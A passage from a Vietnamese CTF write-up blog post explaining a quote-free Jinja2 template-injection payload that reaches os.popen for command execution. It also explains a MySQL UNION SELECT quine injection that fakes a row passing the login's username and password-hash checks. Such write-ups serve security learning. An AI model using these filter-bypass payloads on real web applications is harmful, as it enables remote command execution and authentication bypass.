class="built_in">dict</span>(c=<span class="number">1</span>)|first)</span><br><span class="line">)</span><br><span class="line">|attr(<span class="built_in">dict</span>(read=<span class="number">1</span>)|first)()&#125;&#125;</span><br><span class="line">\</span><br></pre></td></tr></table></figure>
+
+<p>1.1 Vì sao dict(x&#x3D;1)|first?</p>
+<ul>
+<li><p>Ta bị cấm quote nên không thể viết <code>__init__</code>, <code>os</code>, <code>&#39;popen&#39;</code>…</p>
+</li>
+<li><p>Mẹo: <code>dict(__init__=1)</code> tạo dict có key <code>__init__</code>, rồi <code>|first</code> lấy key đầu tiên → trả về string <code>__init__</code> mà không cần quotes.</p>
+</li>
+<li><p>Tương tự:<br><code>dict(os=1)|first</code> → “os”</p>
+</li>
+</ul>
+<p><code>dict(popen=1)|first</code> → “popen”</p>
+<p><code>dict(c=1)|first</code> → “c”</p>
+<p>1.2 Vì sao dùng |attr(…)?</p>
+<ul>
+<li>Ta bị cấm dấu <code>.</code> nên không thể <code>cycler.__init__....</code><br><code>|attr(name)</code> là cách truy cập attribute không cần dot.</li>
+</ul>
+<p>1.3 Chuỗi hành vi của payload</p>
+<ul>
+<li>Nó tương đương với dạng “có dot&#x2F;quotes” như:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; os.popen(request.args.get(<span class="string">&quot;c&quot;</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>nhưng được viết lại để: không dot, không quotes</p>
+<p><strong>2. UNION SELECT để trả về row giả (qua check)</strong></p>
+<ul>
+<li>Mục tiêu:</li>
+</ul>
+<p><code>&lt;col1&gt;</code> phải bằng đúng username đã gửi (để pass row[0]&#x3D;&#x3D;username_input)</p>
+<p><code>&lt;col2&gt;</code> phải bằng đúng sha256(password_input) (để pass hash check)</p>
+<p>2.1 Vì sao CAST(0x… AS CHAR)?</p>
+<ul>
+<li>Không dùng quotes nên không thể <code>&#123;&#123;...&#125;&#125;</code>.</li>
+<li>Ta sẽ đưa username ở dạng hex literal:</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CAST</span>(<span class="number">0x7b7b</span>..<span class="number">.7</span>d7d5c <span class="keyword">AS</span> <span class="type">CHAR</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Giải nghĩa:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7b = &#123;</span><br><span class="line"></span><br><span class="line">0x7d = &#125;</span><br><span class="line"></span><br><span class="line">0x5c = \</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&gt; <code>0x7b7b...7d7d5c</code> chính là chuỗi username <code>&#123;&#123;...&#125;&#125;\</code>.</p>
+<p><code>CAST(... AS CHAR)</code> ép MySQL coi hex đó như chuỗi text để trả về làm cột 1.</p>
+<p>2.2 Phần quine: làm sao để <code>&lt;col2&gt; = SHA256(password_input)</code>?</p>
+<ul>
+<li><p>Ý tưởng quine tổng quát</p>
+<ul>
+<li>Tạo một template @q có chứa một placeholder (dùng <strong>0x3f &#x3D; ký tự ?</strong>)</li>
+<li>Sau đó dựng ra chuỗi hoàn chỉnh bằng: <code>REPLACE(@q, 0x3f, LOWER(HEX(@q)))</code></li>
+</ul>
+</li>
+<li><p>Nghĩa là: thay <code>?</code> bằng hex của cả template <code>@q</code>.</p>
+</li>
+</ul>
+<p>2.3 Hash chuỗi hoàn chỉnh đó:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LOWER</span>(SHA2( <span class="operator">&lt;</span>chuỗi quine<span class="operator">&gt;</span>, <span class="number">256</span>))</span><br></pre></td></tr></table></figure>
+
+<p>2.4 Vì sao <code>LOWER(HEX(@q))</code>?</p>
+<ul>
+<li>HEX(@q) trả chuỗi hex thường là uppercase.</li>
+<li>Dùng <code>LOWER(...)</code> để trùng <code>hexdigest()</code> (lowercase).</li>
+</ul>
+<p>2.5 Cấu trúc <code>IF((@q := ... ) IS NOT NULL, ..., 0)</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IF(</span><br><span class="line">  ((<span class="variable">@q</span> :<span class="operator">=</span> <span class="number">0</span>x... ) <span class="keyword">IS</span> <span class="keyword">NOT NULL</span>),</span><br><span class="line">  <span class="built_in">LOWER</span>(SHA2(REPLACE(<span class="variable">@q</span>,<span class="number">0x3f</span>,<span class="built_in">LOWER</span>(HEX(<span class="variable">@q</span>))),<span class="number">256</span>)),</span><br><span class="line">  <span class="number">0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Giải thích:</li>
+</ul>
+<p><code>(@q := 0x...)</code> gán template vào biến session <code>@q</code>.</p>
+<p><code>... IS NOT NULL</code> luôn đúng (vì gán chuỗi), nên nhánh TRUE chạy.</p>
+<p>Nhánh TRUE tính hash của chuỗi quine.</p>
+<ul>
+<li>Đây là kỹ thuật <strong>vừa gán biến vừa dùng</strong> trong cùng một biểu thức.</li>
+</ul>
+<p>2.6 Vì sao bên trong template <code>@q</code> lại chứa <code>0x3f</code>?</p>
+<ul>
+<li><p>Trong template có nhét sẵn một <code>?</code> để sau đó replace bằng <code>HEX(@q)</code>.</p>
+</li>
+<li><p>Tức là template của password injection đại khái là:</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@q</span> <span class="operator">=</span> &quot; ... 0x3f ... &quot;</span><br><span class="line">P  <span class="operator">=</span> REPLACE(<span class="variable">@q</span>, &quot;?&quot;, <span class="built_in">LOWER</span>(HEX(<span class="variable">@q</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>Sau khi thay, P chính là <strong>chuỗi password injection cuối cùng</strong> mà ta muốn băm.</p>
+<p>2.7 Toàn bộ UNION SELECT của bạn đang làm gì?</p>
+<p>Tóm gọn, payload <strong>trả về row giả</strong> kiểu:</p>
+<ul>
+<li>Cột 1: CAST(0x&lt;hex(username)&gt; AS CHAR)<br>→ đúng y username input → pass check 1</li>
+<li>Cột 2: LOWER(SHA2( REPLACE(@q, ?, HEX(@q)) ,256))<br>→ đúng y sha256(password_input) → pass check 2</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2026/01/19/2026/ctf/uof/wu/">https://elliotbigfan.github.io/2026/01/19/2026/ctf/uof/wu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/uof/poster.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN"><img class="cover" src="/img/research/web/poster.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Research: Bypass Werkzeug Debug PIN</div></div><div class="info-2"><div class="info-item-1">Flask &#x2F; Werkzeug Debug PIN – Full Theory &amp; Exploitation Guide1. Tổng quan bài toánDạng bài này xuất hiện rất thường xuyên trong CTF Web &#x2F; Pentest lab khi:  Server chạy Flask ở chế độ debug Debugger của Werkzeug được bật Truy cập debugger yêu cầu PIN Ứng dụng tồn tại primitive đọc file tùy ý (LFI, path traversal, SSRF → file)  Mục tiêu cuối cùng:  Tính toán chính xác Werkzeug Debug PIN để truy cập interactive console → RCE   2. Điều kiện tiên quyết (Prerequisites)Bài bắt buộc phả...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img class="cover" src="/img/ctf/backdoor/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Writeup: BackdoorCTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến toàn cục contract_seal là địa chỉ libc của hàm system và thực thi các hàm setvbuf. control_manipulation: Encode XOR data người dùng truyền vào buf với nửa phần đầu giá trị của biến contract_seal. war_devils_prophecy:  Encode XOR data người dùng truyền vào buf với nửa phần sau giá trị của biến co...</div></div></div></a><a class="pagination-related" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025"><img class="cover" src="/img/ctf/seccon/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-15</div><div class="info-item-2">Writeup: SECCON CTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: unserialize1. Phân tích challenge: File main.c:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;ssize_t unserialize(FILE *fp, char *buf, size_t size) &#123;  char szbuf[0x20];  char *tmpbuf;  for (size_t i = 0; i &lt; sizeof(szbuf); i++) &#123;    szbuf[i] = fgetc(fp);    if (szbuf[i] == &#x27;:&#x27;) &#123;      szbuf[i] = 0;      b...</div></div></div></a><a class="pagination-related" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img class="cover" src="/img/ctf/asis/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Writeup: ASIS CTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Bookmarks Phân tích file app.py, ta có thể thấy bug CLRF injection nằm ở hàm dashboard và hoàn toàn có thể tận dụng bug này để gây ra XSS.  1234567891011121314151617181920@app.route(&quot;/dashboard&quot;, methods=[&#x27;GET&#x27;])def dashboard():    user_id = session.get(&quot;user_id&quot;)    if not user_id:        return &quot;User not logged&quot;, 400    username = None    with sqlite3.connect(DB_NAME) as conn:        cur = conn.execute(&quot;SELECT username FROM users WHERE id =...</div></div></div></a><a class="pagination-related" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img class="cover" src="/img/ctf/holactf/poster.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-02</div><div class="info-item-2">Writeup: HolaCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP (PHP Phar deserialization) Link tải challenge: hell-ehc Cách chạy challenge:  12345# 1. build imagedocker build -t hell_ehc .# 2. Run containerdocker run -it --rm -p 5005:80 hell_ehc  Solution1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn Vì challenge có cho tính năng upload file nên ta sẽ thử kiểm tra liệu có thể tận dụng điều này để upload trực tiếp webshell và ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-No-Quotes"><span class="toc-number">1.</span> <span class="toc-text">Web | No Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Huong-giai"><span class="toc-number">1.1.</span> <span class="toc-text">Hướng giải</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc"><span class="toc-number">1.2.</span> <span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-No-Quotes-2"><span class="toc-number">2.</span> <span class="toc-text">Web | No Quotes 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Huong-giai-1"><span class="toc-number">2.1.</span> <span class="toc-text">Hướng giải</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-1"><span class="toc-number">2.2.</span> <span class="toc-text">Poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-No-Quotes-3"><span class="toc-number">3.</span> <span class="toc-text">Web | No Quotes 3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Huong-giai-2"><span class="toc-number">3.1.</span> <span class="toc-text">Hướng giải</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-va-giai-thich"><span class="toc-number">3.2.</span> <span class="toc-text">Poc và giải thích</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026"><img src="/img/ctf/uof/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Uof CTF 2026"/></a><div class="content"><a class="title" href="/2026/01/19/2026/ctf/uof/wu/" title="Writeup: Uof CTF 2026">Writeup: Uof CTF 2026</a><time datetime="2026-01-19T09:21:56.000Z" title="Created 2026-01-19 16:21:56">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN"><img src="/img/research/web/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: Bypass Werkzeug Debug PIN"/></a><div class="content"><a class="title" href="/2026/01/18/Research/web/flask-bin/" title="Research: Bypass Werkzeug Debug PIN">Research: Bypass Werkzeug Debug PIN</a><time datetime="2026-01-18T13:31:56.000Z" title="Created 2026-01-18 20:31:56">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img src="/img/ctf/asis/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: ASIS CTF 2025"/></a><div class="content"><a class="title" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025">Writeup: ASIS CTF 2025</a><time datetime="2026-01-14T08:07:34.000Z" title="Created 2026-01-14 15:07:34">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)"><img src="/img/research/pwn/fsop/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Research: File Stream Oriented Programming (FSOP)"/></a><div class="content"><a class="title" href="/2026/01/14/Research/pwn/fsop/" title="Research: File Stream Oriented Programming (FSOP)">Research: File Stream Oriented Programming (FSOP)</a><time datetime="2026-01-14T02:31:32.000Z" title="Created 2026-01-14 09:31:32">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025"><img src="/img/ctf/seccon/logo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: SECCON CTF 2025"/></a><div class="content"><a class="title" href="/2025/12/15/2025/ctf/seccon/wu/" title="Writeup: SECCON CTF 2025">Writeup: SECCON CTF 2025</a><time datetime="2025-12-15T01:40:34.000Z" title="Created 2025-12-15 08:40:34">2025-12-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/uof/poster.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
